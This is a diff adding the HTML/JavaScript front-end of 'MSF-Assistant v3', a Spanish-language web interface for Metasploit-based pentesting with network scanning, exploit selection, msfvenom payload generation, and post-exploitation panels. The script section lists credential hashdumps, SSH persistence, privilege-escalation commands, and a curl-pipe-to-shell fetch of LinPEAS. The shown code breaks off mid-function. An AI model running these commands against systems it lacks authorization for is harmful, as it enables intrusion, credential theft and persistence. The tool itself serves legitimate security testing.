@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MSF-Assistant v3</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Exo+2:wght@400;500;600&display=swap');
+*{box-sizing:border-box;margin:0;padding:0;}
+:root{--bg:#0d1117;--surf:#161b22;--surf2:#1c2128;--border:#30363d;--green:#39d353;--gdim:#1a6b2b;--amber:#e3b341;--red:#f85149;--blue:#58a6ff;--purple:#bc8cff;--cyan:#79c0ff;--text:#e6edf3;--muted:#8b949e;--mono:'Share Tech Mono',monospace;--ui:'Exo 2',sans-serif;}
+html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--ui);}
+.app{display:grid;grid-template-rows:46px 1fr;height:100vh;}
+.topbar{background:var(--surf);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 16px;gap:12px;}
+.dots{display:flex;gap:5px;}.dot{width:11px;height:11px;border-radius:50%;}.dr{background:#f85149;}.da{background:#e3b341;}.dg{background:#39d353;}
+.tb-title{font-family:var(--mono);font-size:12px;color:var(--muted);flex:1;text-align:center;}
+.tb-badges{display:flex;gap:7px;align-items:center;}
+.badge{font-family:var(--mono);font-size:10px;padding:2px 8px;border-radius:4px;border:1px solid;}
+.bg{background:rgba(57,211,83,.1);color:var(--green);border-color:var(--gdim);}
+.br{background:rgba(248,81,73,.1);color:var(--red);border-color:rgba(248,81,73,.3);}
+.ba{background:rgba(227,179,65,.1);color:var(--amber);border-color:rgba(227,179,65,.3);}
+.bp{background:rgba(188,140,255,.1);color:var(--purple);border-color:rgba(188,140,255,.3);}
+.body{display:grid;grid-template-columns:218px 1fr;overflow:hidden;}
+.sidebar{background:var(--surf);border-right:1px solid var(--border);display:flex;flex-direction:column;overflow-y:auto;}
+.sid-sec{padding:11px 12px 9px;border-bottom:1px solid var(--border);}
+.sid-label{font-size:10px;font-family:var(--mono);color:var(--muted);letter-spacing:1px;text-transform:uppercase;margin-bottom:6px;}
+.target-box{background:var(--surf2);border:1px solid var(--border);border-radius:6px;padding:8px 10px;}
+.tgt-ip{color:var(--blue);font-family:var(--mono);font-size:14px;font-weight:600;}
+.tgt-name{color:var(--muted);font-size:11px;margin-top:2px;}
+.nav-item{display:flex;align-items:center;gap:9px;padding:8px 14px;font-size:13px;cursor:pointer;border-left:3px solid transparent;transition:all .15s;color:var(--muted);}
+.nav-item:hover{background:var(--surf2);color:var(--text);}
+.nav-item.active{background:rgba(88,166,255,.08);border-left-color:var(--blue);color:var(--blue);}
+.nav-icon{font-size:14px;width:16px;}
+.nbadge{margin-left:auto;font-size:10px;font-family:var(--mono);padding:1px 6px;border-radius:3px;background:var(--surf2);color:var(--muted);border:1px solid var(--border);}
+.nbadge.ok{background:rgba(57,211,83,.1);color:var(--green);border-color:var(--gdim);}
+.nbadge.warn{background:rgba(227,179,65,.1);color:var(--amber);border-color:rgba(227,179,65,.3);}
+.nbadge.purple{background:rgba(188,140,255,.1);color:var(--purple);border-color:rgba(188,140,255,.3);}
+.lhost-box{padding:9px 12px;border-top:1px solid var(--border);margin-top:auto;}
+.lhost-val{font-family:var(--mono);font-size:12px;color:var(--green);}
+.main{display:flex;flex-direction:column;overflow:hidden;}
+.tab-bar{background:var(--surf);border-bottom:1px solid var(--border);padding:0 14px;display:flex;flex-shrink:0;}
+.tab{padding:9px 15px;font-size:12px;font-family:var(--mono);cursor:pointer;color:var(--muted);border-bottom:2px solid transparent;transition:all .15s;}
+.tab:hover{color:var(--text);}.tab.on{color:var(--blue);border-bottom-color:var(--blue);}
+.panels{flex:1;overflow:hidden;}
+.panel{display:none;height:100%;overflow-y:auto;padding:14px;flex-direction:column;gap:12px;}
+.panel.vis{display:flex;}
+.card{background:var(--surf);border:1px solid var(--border);border-radius:8px;padding:13px 15px;flex-shrink:0;}
+.ctitle{font-size:11px;font-family:var(--mono);color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px;display:flex;align-items:center;gap:6px;}
+.ctitle i{font-size:13px;color:var(--blue);}
+.fgroup{display:flex;flex-direction:column;gap:5px;}
+.flabel{font-size:10px;font-family:var(--mono);color:var(--muted);text-transform:uppercase;letter-spacing:.5px;}
+.fi{background:var(--surf2);border:1px solid var(--border);border-radius:5px;padding:7px 10px;font-family:var(--mono);font-size:12px;color:var(--text);outline:none;transition:border .15s;width:100%;}
+.fi:focus{border-color:var(--blue);}
+select.fi{appearance:none;cursor:pointer;}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;}
+.btn{border-radius:6px;padding:7px 13px;font-family:var(--mono);font-size:12px;cursor:pointer;transition:all .15s;display:inline-flex;align-items:center;gap:6px;border:1px solid;}
+.btn-blue{background:rgba(88,166,255,.1);border-color:rgba(88,166,255,.35);color:var(--blue);}
+.btn-blue:hover{background:rgba(88,166,255,.2);}
+.btn-green{background:rgba(57,211,83,.1);border-color:var(--gdim);color:var(--green);}
+.btn-green:hover{background:rgba(57,211,83,.2);}
+.btn-amber{background:rgba(227,179,65,.1);border-color:rgba(227,179,65,.35);color:var(--amber);}
+.btn-amber:hover{background:rgba(227,179,65,.2);}
+.btn-red{background:rgba(248,81,73,.1);border-color:rgba(248,81,73,.35);color:var(--red);}
+.btn-red:hover{background:rgba(248,81,73,.2);}
+.btn-purple{background:rgba(188,140,255,.1);border-color:rgba(188,140,255,.35);color:var(--purple);}
+.btn-purple:hover{background:rgba(188,140,255,.2);}
+.btn:disabled{opacity:.4;cursor:not-allowed;}
+.btnrow{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;}
+.terminal{background:#010409;border:1px solid var(--border);border-radius:8px;overflow:hidden;font-family:var(--mono);font-size:12px;flex-shrink:0;}
+.tbar{background:var(--surf2);padding:6px 12px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border);}
+.ttitle{font-size:11px;color:var(--muted);flex:1;text-align:center;}
+.tclear{font-size:10px;color:var(--muted);cursor:pointer;padding:2px 6px;border:1px solid var(--border);border-radius:3px;}
+.tclear:hover{color:var(--red);border-color:var(--red);}
+.tbody{padding:12px 14px;line-height:1.75;height:280px;overflow-y:auto;font-size:11.5px;}
+.t-line{display:block;white-space:pre-wrap;word-break:break-all;}
+.tp{color:var(--green);}.tc{color:var(--text);}.tm{color:var(--muted);}.to{color:var(--amber);}
+.ts{color:var(--green);}.terr{color:var(--red);}.ti2{color:var(--blue);}.tsess{color:var(--purple);}.tcyan{color:var(--cyan);}
+.tool-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:12px;}
+.tool-card{background:var(--surf2);border:1px solid var(--border);border-radius:6px;padding:10px 12px;cursor:pointer;transition:all .15s;}
+.tool-card:hover{border-color:var(--blue);}.tool-card.sel{border-color:var(--green);background:rgba(57,211,83,.05);}
+.tool-name{font-family:var(--mono);font-size:12px;color:var(--text);}
+.tool-desc{font-size:11px;color:var(--muted);margin-top:3px;}
+.tool-status{font-size:10px;margin-top:4px;font-family:var(--mono);}
+.ts-ok{color:var(--green);}.ts-no{color:var(--red);}
+.host-item{background:var(--surf2);border:1px solid var(--border);border-radius:6px;padding:9px 12px;display:flex;align-items:center;gap:12px;cursor:pointer;transition:all .15s;margin-bottom:6px;}
+.host-item:hover{border-color:var(--cyan);}.host-item.chosen{border-color:var(--green);}
+.host-ip{font-family:var(--mono);font-size:14px;color:var(--cyan);min-width:130px;}
+.host-info{flex:1;}
+.host-name{font-size:12px;color:var(--text);}
+.host-ports{font-family:var(--mono);font-size:10px;color:var(--muted);margin-top:2px;}
+.sel-btn{font-size:11px;font-family:var(--mono);padding:4px 10px;border-radius:4px;background:rgba(88,166,255,.1);border:1px solid rgba(88,166,255,.3);color:var(--blue);cursor:pointer;flex-shrink:0;}
+.sel-btn:hover{background:rgba(88,166,255,.2);}.sel-btn.done{background:rgba(57,211,83,.1);border-color:var(--gdim);color:var(--green);}
+.filter-row{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px;}
+.fbtn{font-size:11px;font-family:var(--mono);padding:3px 10px;border-radius:4px;border:1px solid var(--border);background:var(--surf2);color:var(--muted);cursor:pointer;transition:all .15s;}
+.fbtn:hover{color:var(--text);}.fbtn.on{background:rgba(88,166,255,.1);border-color:rgba(88,166,255,.4);color:var(--blue);}
+.exploit-item{background:var(--surf2);border:1px solid var(--border);border-radius:6px;padding:9px 11px;cursor:pointer;transition:all .15s;display:flex;align-items:flex-start;gap:9px;margin-bottom:6px;}
+.exploit-item:hover{border-color:var(--blue);}.exploit-item.sel{border-color:var(--green);}
+.erank{font-family:var(--mono);font-size:10px;padding:2px 5px;border-radius:3px;margin-top:1px;flex-shrink:0;}
+.exc{background:rgba(57,211,83,.15);color:var(--green);border:1px solid var(--gdim);}
+.grt{background:rgba(88,166,255,.15);color:var(--blue);border:1px solid rgba(88,166,255,.3);}
+.goo{background:rgba(227,179,65,.15);color:var(--amber);border:1px solid rgba(227,179,65,.3);}
+.einfo{flex:1;}.ename{font-family:var(--mono);font-size:12px;color:var(--text);}
+.edesc{font-size:11px;color:var(--muted);margin-top:2px;}
+.eport{font-family:var(--mono);font-size:10px;color:var(--purple);margin-top:2px;}
+.cvetag{font-family:var(--mono);font-size:10px;color:var(--red);background:rgba(248,81,73,.1);border:1px solid rgba(248,81,73,.2);border-radius:3px;padding:1px 5px;margin-left:5px;}
+.cattag{font-family:var(--mono);font-size:10px;padding:1px 6px;border-radius:3px;border:1px solid;margin-left:5px;}
+.cat-web{color:var(--cyan);background:rgba(121,192,255,.1);border-color:rgba(121,192,255,.3);}
+.cat-smb{color:var(--red);background:rgba(248,81,73,.1);border-color:rgba(248,81,73,.3);}
+.cat-ftp{color:var(--amber);background:rgba(227,179,65,.1);border-color:rgba(227,179,65,.3);}
+.cat-irc{color:var(--green);background:rgba(57,211,83,.1);border-color:var(--gdim);}
+.cat-net{color:var(--purple);background:rgba(188,140,255,.1);border-color:rgba(188,140,255,.3);}
+.cat-ssh{color:var(--blue);background:rgba(88,166,255,.1);border-color:rgba(88,166,255,.3);}
+.cat-db{color:var(--amber);background:rgba(227,179,65,.1);border-color:rgba(227,179,65,.3);}
+.opts-grid{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-bottom:10px;}
+.opt-row{background:var(--surf2);border:1px solid var(--border);border-radius:5px;padding:7px 9px;}
+.ok2{font-family:var(--mono);font-size:10px;color:var(--muted);}
+.ov{font-family:var(--mono);font-size:12px;color:var(--text);margin-top:2px;}
+.note-box{background:rgba(57,211,83,.05);border:1px solid var(--gdim);border-radius:6px;padding:8px 12px;font-size:11px;color:var(--green);font-family:var(--mono);line-height:1.6;margin-bottom:10px;}
+.warn-box{background:rgba(227,179,65,.06);border:1px solid rgba(227,179,65,.3);border-radius:6px;padding:8px 12px;font-size:11px;color:var(--amber);font-family:var(--mono);line-height:1.6;}
+.err-box{background:rgba(248,81,73,.06);border:1px solid rgba(248,81,73,.3);border-radius:6px;padding:8px 12px;font-size:11px;color:var(--red);font-family:var(--mono);line-height:1.6;}
+.chips{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px;}
+.chip{display:inline-flex;align-items:center;gap:3px;font-family:var(--mono);font-size:11px;padding:2px 7px;border-radius:4px;border:1px solid;}
+.ch-blue{border-color:rgba(88,166,255,.3);color:var(--blue);background:rgba(88,166,255,.07);}
+.ch-green{border-color:var(--gdim);color:var(--green);background:rgba(57,211,83,.07);}
+.ch-red{border-color:rgba(248,81,73,.3);color:var(--red);background:rgba(248,81,73,.07);}
+.ch-amber{border-color:rgba(227,179,65,.3);color:var(--amber);background:rgba(227,179,65,.07);}
+.ch-cyan{border-color:rgba(121,192,255,.3);color:var(--cyan);background:rgba(121,192,255,.07);}
+.ch-purple{border-color:rgba(188,140,255,.3);color:var(--purple);background:rgba(188,140,255,.07);}
+.step{display:flex;align-items:center;gap:9px;padding:8px 10px;background:var(--surf2);border:1px solid var(--border);border-radius:6px;cursor:pointer;transition:all .15s;margin-bottom:5px;}
+.step:hover{border-color:var(--green);}
+.snum{width:22px;height:22px;border-radius:50%;background:var(--surf);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:10px;color:var(--muted);flex-shrink:0;}
+.snum.done{background:var(--gdim);border-color:var(--green);color:var(--green);}
+.stxt{flex:1;font-family:var(--mono);font-size:12px;color:var(--text);}
+.scmd{font-size:11px;color:var(--muted);margin-top:1px;}
+.scopy{font-size:10px;color:var(--muted);background:var(--surf);border:1px solid var(--border);border-radius:3px;padding:2px 6px;cursor:pointer;font-family:var(--mono);transition:all .1s;flex-shrink:0;}
+.scopy:hover{color:var(--blue);border-color:var(--blue);}
+.payload-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px;}
+.pcard{background:var(--surf2);border:1px solid var(--border);border-radius:6px;padding:10px 12px;cursor:pointer;transition:all .15s;}
+.pcard:hover{border-color:var(--purple);}.pcard.sel{border-color:var(--purple);background:rgba(188,140,255,.05);}
+.pcard-name{font-family:var(--mono);font-size:12px;color:var(--text);}
+.pcard-os{font-size:10px;font-family:var(--mono);margin-top:3px;}
+.os-linux{color:var(--green);}.os-windows{color:var(--cyan);}.os-web{color:var(--amber);}.os-java{color:var(--red);}
+.pcard-note{font-size:10px;color:var(--muted);margin-top:3px;}
+.dl-btn{background:rgba(57,211,83,.1);border:1px solid var(--gdim);color:var(--green);border-radius:5px;padding:6px 12px;font-family:var(--mono);font-size:11px;cursor:pointer;display:inline-flex;align-items:center;gap:5px;text-decoration:none;}
+.dl-btn:hover{background:rgba(57,211,83,.2);}
+.scanning-anim{display:inline-block;animation:blink 1s step-start infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
+#toast{position:fixed;bottom:18px;right:18px;background:var(--gdim);color:var(--green);border:1px solid var(--green);border-radius:6px;padding:7px 15px;font-family:var(--mono);font-size:12px;opacity:0;transition:opacity .2s;pointer-events:none;z-index:999;}
+#toast.show{opacity:1;}
+</style>
+</head>
+<body>
+<div id="toast">Copiado!</div>
+<div class="app">
+<div class="topbar">
+  <div class="dots"><div class="dot dr"></div><div class="dot da"></div><div class="dot dg"></div></div>
+  <span class="tb-title">msf-assistant v3.0 — pentesting web tool | Kali Linux</span>
+  <div class="tb-badges">
+    <span class="badge {% if is_root %}bg{% else %}br{% endif %}" id="root-badge">{% if is_root %}● root{% else %}sin root{% endif %}</span>
+    <span class="badge ba" id="msf-badge">msf: ...</span>
+    <span class="badge bp" id="venom-badge">msfvenom: ...</span>
+  </div>
+</div>
+<div class="body">
+<div class="sidebar">
+  <div class="sid-sec">
+    <div class="sid-label">Target activo</div>
+    <div class="target-box">
+      <div class="tgt-ip" id="disp-ip">–.–.–.–</div>
+      <div class="tgt-name" id="disp-name">Sin objetivo</div>
+    </div>
+  </div>
+  <div style="padding:9px 12px 5px;"><div class="sid-label">Fases</div></div>
+  <nav>
+    <div class="nav-item active" data-panel="scan" onclick="showPanel('scan',this)">
+      <span class="nav-icon"><i class="ti ti-radar" aria-hidden="true"></i></span>Escaneo<span class="nbadge warn" id="nb-scan">PASO 1</span>
+    </div>
+    <div class="nav-item" data-panel="exploits" onclick="showPanel('exploits',this)">
+      <span class="nav-icon"><i class="ti ti-bug" aria-hidden="true"></i></span>Exploits<span class="nbadge" id="nb-expl">–</span>
+    </div>
+    <div class="nav-item" data-panel="config" onclick="showPanel('config',this)">
+      <span class="nav-icon"><i class="ti ti-settings" aria-hidden="true"></i></span>Configurar<span class="nbadge" id="nb-cfg"></span>
+    </div>
+    <div class="nav-item" data-panel="launch" onclick="showPanel('launch',this)">
+      <span class="nav-icon"><i class="ti ti-player-play" aria-hidden="true"></i></span>Lanzar<span class="nbadge" id="nb-launch"></span>
+    </div>
+    <div class="nav-item" data-panel="payloads" onclick="showPanel('payloads',this)">
+      <span class="nav-icon"><i class="ti ti-box" aria-hidden="true"></i></span>Payloads<span class="nbadge purple">msfvenom</span>
+    </div>
+    <div class="nav-item" data-panel="post" onclick="showPanel('post',this)">
+      <span class="nav-icon"><i class="ti ti-shield-check" aria-hidden="true"></i></span>Post-exploit
+    </div>
+  </nav>
+  <div class="lhost-box">
+    <div class="sid-label">Tu IP (LHOST)</div>
+    <div class="lhost-val" id="lhost-disp">{{ local_ip }}</div>
+  </div>
+</div>
+
+<div class="main">
+<div class="tab-bar"><div class="tab on" id="tab-label">Reconocimiento de red</div></div>
+<div class="panels">
+
+<!-- SCAN -->
+<div class="panel vis" id="panel-scan">
+  {% if not is_root %}<div class="err-box">Ejecuta con sudo para usar netdiscover y nmap. → sudo python3 app.py</div>{% endif %}
+  <div class="card">
+    <div class="ctitle"><i class="ti ti-network" aria-hidden="true"></i> Configuracion de red</div>
+    <div class="row2">
+      <div class="fgroup"><div class="flabel">Rango CIDR</div><input class="fi" id="scan-range" type="text" value="192.168.56.0/24"/></div>
+      <div class="fgroup"><div class="flabel">Interfaz</div>
+        <select class="fi" id="scan-iface">{% for i in interfaces %}<option value="{{ i.name }}">{{ i.name }}{% if i.ip %} — {{ i.ip }}{% endif %}</option>{% endfor %}</select>
+      </div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="ctitle"><i class="ti ti-radar-2" aria-hidden="true"></i> Herramienta</div>
+    <div class="tool-grid">
+      <div class="tool-card sel" id="tool-netdiscover" onclick="selTool('netdiscover',this)"><div class="tool-name">netdiscover</div><div class="tool-desc">ARP activo/pasivo. Mas rapido en LAN.</div><div class="tool-status" id="st-netdiscover">...</div></div>
+      <div class="tool-card" id="tool-nmap-ping" onclick="selTool('nmap-ping',this)"><div class="tool-name">nmap ping scan</div><div class="tool-desc">Descubrimiento sin puertos.</div><div class="tool-status" id="st-nmap-ping">...</div></div>
+      <div class="tool-card" id="tool-nmap-full" onclick="selTool('nmap-full',this)"><div class="tool-name">nmap full scan</div><div class="tool-desc">Puertos + versiones + OS.</div><div class="tool-status" id="st-nmap-full">...</div></div>
+    </div>
+    <div class="btnrow">
+      <button class="btn btn-green" id="btn-scan" onclick="startScan()"><i class="ti ti-player-play" aria-hidden="true"></i> Iniciar escaneo real</button>
+      <button class="btn btn-red" id="btn-stop" onclick="stopScan()" style="display:none;"><i class="ti ti-square" aria-hidden="true"></i> Detener</button>
+    </div>
+  </div>
+  <div class="terminal"><div class="tbar"><div class="dot dg"></div><span class="ttitle" id="scan-title">terminal — esperando...</span><span class="tclear" onclick="clearT('scan-out')">limpiar</span></div><div class="tbody" id="scan-out"><span class="tm t-line">Pulsa "Iniciar escaneo real" para empezar.</span></div></div>
+  <div id="hosts-wrap" style="display:none;">
+    <div class="card"><div class="ctitle"><i class="ti ti-list-search" aria-hidden="true"></i> Hosts descubiertos <span id="hosts-count" style="color:var(--green);"></span></div><div id="hosts-list"></div><div class="warn-box" style="margin-top:8px;">Haz clic en Seleccionar para usar ese host como objetivo.</div></div>
+  </div>
+</div>
+
+<!-- EXPLOITS -->
+<div class="panel" id="panel-exploits">
+  <div class="card">
+    <div class="ctitle"><i class="ti ti-filter" aria-hidden="true"></i> Filtros</div>
+    <div class="filter-row">
+      <div class="fbtn on" onclick="setFilter('all',this)">todos</div>
+      <div class="fbtn" onclick="setFilter('web',this)">web</div>
+      <div class="fbtn" onclick="setFilter('smb',this)">smb</div>
+      <div class="fbtn" onclick="setFilter('ftp',this)">ftp</div>
+      <div class="fbtn" onclick="setFilter('ssh',this)">ssh</div>
+      <div class="fbtn" onclick="setFilter('irc',this)">irc</div>
+      <div class="fbtn" onclick="setFilter('db',this)">db</div>
+      <div class="fbtn" onclick="setFilter('net',this)">network</div>
+    </div>
+    <input class="fi" id="exploit-search" type="text" placeholder="Buscar por nombre, CVE, puerto..." oninput="renderExploits()"/>
+  </div>
+  <div id="exploit-list"></div>
+</div>
+
+<!-- CONFIG -->
+<div class="panel" id="panel-config">
+  <div class="card" id="cfg-empty"><div class="warn-box" style="margin-bottom:0;">Selecciona un exploit primero.</div></div>
+  <div id="cfg-main" style="display:none;">
+    <div class="card">
+      <div class="ctitle"><i class="ti ti-info-circle" aria-hidden="true"></i> Exploit seleccionado</div>
+      <div class="chips" id="cfg-chips"></div>
+      <div class="note-box" id="cfg-note"></div>
+      <div class="opts-grid" id="cfg-opts"></div>
+    </div>
+    <div class="card">
+      <div class="ctitle"><i class="ti ti-adjustments" aria-hidden="true"></i> Ajustar parametros</div>
+      <div class="row2" style="margin-bottom:10px;">
+        <div class="fgroup"><div class="flabel">RHOSTS (Target IP)</div><input class="fi" id="cfg-rhosts" type="text"/></div>
+        <div class="fgroup"><div class="flabel">LHOST (tu IP Kali)</div><input class="fi" id="cfg-lhost" type="text" value="{{ local_ip }}"/></div>
+      </div>
+      <div class="row2">
+        <div class="fgroup"><div class="flabel">LPORT</div><input class="fi" id="cfg-lport" type="text" value="4444"/></div>
+        <div class="fgroup"><div class="flabel">RPORT</div><input class="fi" id="cfg-rport" type="text"/></div>
+      </div>
+      <div class="btnrow">
+        <button class="btn btn-green" onclick="prepLaunch()"><i class="ti ti-player-play" aria-hidden="true"></i> Preparar y lanzar</button>
+        <button class="btn btn-blue" onclick="downloadRC()"><i class="ti ti-download" aria-hidden="true"></i> Descargar .rc</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- LAUNCH -->
+<div class="panel" id="panel-launch">
+  <div class="card" id="launch-empty"><div class="warn-box" style="margin-bottom:0;">Configura un exploit y pulsa "Preparar y lanzar".</div></div>
+  <div id="launch-main" style="display:none;">
+    <div class="card"><div class="ctitle"><i class="ti ti-terminal-2" aria-hidden="true"></i> Secuencia generada</div><div id="launch-steps"></div></div>
+    <div class="terminal"><div class="tbar"><div class="dot dg"></div><span class="ttitle" id="msf-title">msfconsole — esperando...</span><span class="tclear" onclick="clearT('msf-out')">limpiar</span></div><div class="tbody" id="msf-out"><span class="tm t-line">Pulsa "Ejecutar en Metasploit" para lanzar.</span></div></div>
+    <div class="btnrow">
+      <button class="btn btn-green" id="btn-msf-run" onclick="runMSF()"><i class="ti ti-bolt" aria-hidden="true"></i> Ejecutar en Metasploit</button>
+      <button class="btn btn-red" id="btn-msf-stop" onclick="stopMSF()" style="display:none;"><i class="ti ti-square" aria-hidden="true"></i> Detener</button>
+    </div>
+  </div>
+</div>
+
+<!-- PAYLOADS -->
+<div class="panel" id="panel-payloads">
+  <div class="card">
+    <div class="ctitle"><i class="ti ti-box" aria-hidden="true"></i> Tipo de payload (msfvenom)</div>
+    <div class="payload-grid" id="payload-grid"></div>
+  </div>
+  <div class="card" id="payload-cfg-card" style="display:none;">
+    <div class="ctitle"><i class="ti ti-adjustments" aria-hidden="true"></i> Configuracion del payload</div>
+    <div class="chips" id="payload-chips"></div>
+    <div class="note-box" id="payload-note"></div>
+    <div class="row2" style="margin-bottom:10px;">
+      <div class="fgroup"><div class="flabel">LHOST (tu IP Kali)</div><input class="fi" id="pv-lhost" type="text" value="{{ local_ip }}"/></div>
+      <div class="fgroup"><div class="flabel">LPORT</div><input class="fi" id="pv-lport" type="text" value="4444"/></div>
+    </div>
+    <div class="row2" style="margin-bottom:10px;">
+      <div class="fgroup">
+        <div class="flabel">Encoder</div>
+        <select class="fi" id="pv-encoder">
+          {% for id, enc in encoders.items() %}<option value="{{ id }}">{{ enc.name }}</option>{% endfor %}
+        </select>
+      </div>
+      <div class="fgroup"><div class="flabel">Bad chars (opcional)</div><input class="fi" id="pv-badchars" type="text" placeholder="\x00\x0a"/></div>
+    </div>
+    <div class="card" style="margin-bottom:10px;padding:10px 12px;">
+      <div class="ctitle" style="margin-bottom:6px;"><i class="ti ti-terminal" aria-hidden="true"></i> Comando que se ejecutara</div>
+      <div id="pv-cmd-preview" style="font-family:var(--mono);font-size:11px;color:var(--cyan);word-break:break-all;line-height:1.7;"></div>
+    </div>
+    <div class="btnrow">
+      <button class="btn btn-purple" onclick="genPayload()"><i class="ti ti-bolt" aria-hidden="true"></i> Generar payload real</button>
+    </div>
+  </div>
+  <div class="terminal" id="payload-term" style="display:none;">
+    <div class="tbar"><div class="dot dg"></div><span class="ttitle" id="pv-title">msfvenom — esperando...</span><span class="tclear" onclick="clearT('pv-out')">limpiar</span></div>
+    <div class="tbody" id="pv-out"></div>
+  </div>
+  <div id="pv-result" style="display:none;">
+    <div class="card">
+      <div class="ctitle"><i class="ti ti-check" aria-hidden="true"></i> Payload listo</div>
+      <div class="note-box" id="pv-deliver"></div>
+      <div class="btnrow">
+        <a class="dl-btn" id="pv-dl-link" href="#"><i class="ti ti-download" aria-hidden="true"></i> Descargar payload</a>
+        <button class="btn btn-blue" onclick="showPanel('launch', document.querySelector(\'[data-panel=launch]\'))"><i class="ti ti-player-play" aria-hidden="true"></i> Ir a lanzar listener</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- POST -->
+<div class="panel" id="panel-post">
+  <div class="card"><div class="ctitle"><i class="ti ti-shield-check" aria-hidden="true"></i> Post-explotacion</div><div id="post-steps"></div></div>
+  <div class="card"><div class="ctitle"><i class="ti ti-list" aria-hidden="true"></i> Comandos Meterpreter</div><div id="meterp-cmds"></div></div>
+  <div class="card"><div class="ctitle"><i class="ti ti-key" aria-hidden="true"></i> Escalada privilegios Linux</div><div id="privesc-cmds"></div></div>
+</div>
+
+</div></div></div></div>
+<script>
+const TAB_LABELS={scan:'Reconocimiento de red',exploits:'Seleccion de exploit',config:'Configuracion del exploit',launch:'Lanzar ataque',payloads:'Generador de Payloads (msfvenom)',post:'Post-explotacion'};
+let activeTool='netdiscover',selExploit=null,selPayloadId=null,activeFilter='all',targetIP='',scanESS=null,msfESS=null,pvESS=null,exploitsData=[],payloadTemplates={};
+
+const POST_STEPS=[
+  {t:'Local Exploit Suggester',c:'run post/multi/recon/local_exploit_suggester'},
+  {t:'Enumerar sistema Linux',c:'run post/linux/gather/enum_system'},
+  {t:'Dump hashes Linux',c:'run post/linux/gather/hashdump'},
+  {t:'Dump hashes Windows',c:'run post/windows/gather/hashdump'},
+  {t:'Shell a Meterpreter',c:'run post/multi/manage/shell_to_meterpreter'},
+  {t:'Persistencia SSH Linux',c:'run post/linux/manage/sshkey_persistence'},
+  {t:'Capturar pantalla',c:'screenshot'},
+];
+const METERP=[{t:'Info sistema',c:'sysinfo'},{t:'Usuario actual',c:'getuid'},{t:'Escalar privilegios',c:'getsystem'},{t:'Shell interactiva',c:'shell'},{t:'Listar procesos',c:'ps'},{t:'Descargar /etc/passwd',c:'download /etc/passwd /tmp/'},{t:'Buscar .txt',c:"search -f '*.txt'"},{t:'Subir archivo',c:'upload /ruta/local /tmp/'}];
+const PRIVESC=[{t:'Buscar SUID peligrosos',c:'find / -perm -u=s -type f 2>/dev/null'},{t:'Ver sudoers',c:'sudo -l'},{t:'LinPEAS',c:'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh'},{t:'Version del kernel',c:'uname -a'},{t:'Crontabs',c:'cat /etc/crontab'}];
+
+window.onload=async()=>{await checkTools();await loadExploits();await loadPayloads();renderPost();};
+
+async function checkTools(){
+  try{
+    const r=await fetch('/api/check-tools');const d=await r.json();
+    document.getElementById('st-netdiscover').innerHTML=d.netdiscover?'<span class="ts-ok">instalado</span>':'<span class="ts-no">no encontrado — sudo apt install netdiscover</span>';
+    document.getElementById('st-nmap-ping').innerHTML=d.nmap?'<span class="ts-ok">instalado</span>':'<span class="ts-no">no encontrado</span>';
+    document.getElementById('st-nmap-full').innerHTML=d.nmap?'<span class="ts-ok">instalado</span>':'<span class="ts-no">no encontrado</span>';
+    document.getElementById('msf-badge').textContent='msf: '+(d.msfconsole?'listo':'no encontrado');
+    document.getElementById('msf-badge').className='badge '+(d.msfconsole?'bg':'br');
+    document.getElementById('venom-badge').textContent='msfvenom: '+(d.msfvenom?'listo':'no encontrado');
+    document.getElementById('venom-badge').className='badge '+(d.msfvenom?'bp':'br');
+    const r2=await fetch('/api/localip');const d2=await r2.json();
+    document.getElementById('lhost-disp').textContent=d2.ip;
+    document.getElementById('cfg-lhost').value=d2.ip;
+    document.getElementById('pv-lhost').value=d2.ip;
+  }catch(e){}
+}
+
+async function loadExploits(){
+  try{const r=await fetch('/api/exploits');exploitsData=await r.json();document.getElementById('nb-expl').textContent=exploitsData.length;renderExploits();}catch(e){}
+}
+
+async function loadPayloads(){
+  try{const r=await fetch('/api/payload-templates');payloadTemplates=await r.json();renderPayloadGrid();}catch(e){}
+}
+
+function showPanel(name,el){
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  if(el)el.classList.add('active');
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('vis'));
+  document.getElementById('panel-'+name).classList.add('vis');
+  document.getElementById('tab-label').textContent=TAB_LABELS[name]||name;
+}
+
+function selTool(t,el){activeTool=t;document.querySelectorAll('.tool-card').forEach(c=>c.classList.remove('sel'));el.classList.add('sel');}
+
+function startScan(){
+  if(scanESS)scanESS.close();
+  const range=document.getElementById('scan-range').value.trim();
+  const iface=document.getElementById('scan-iface').value;
+  const out=document.getElementById('scan-out');
+  out.innerHTML='';
+  document.getElementById('hosts-wrap').style.display='none';
+  document.getElementById('btn-scan').style.display='none';
+  document.getElementById('btn-stop').style.display='inline-flex';
+  document.getElementById('scan-title').innerHTML='<span class="scanning-anim">ESCANEANDO...</span>';
+  const url=`/api/scan/stream?tool=${activeTool}&network=${encodeURIComponent(range)}&iface=${encodeURIComponent(iface)}`;
+  scanESS=new EventSource(url);
+  scanESS.onmessage=(e)=>{
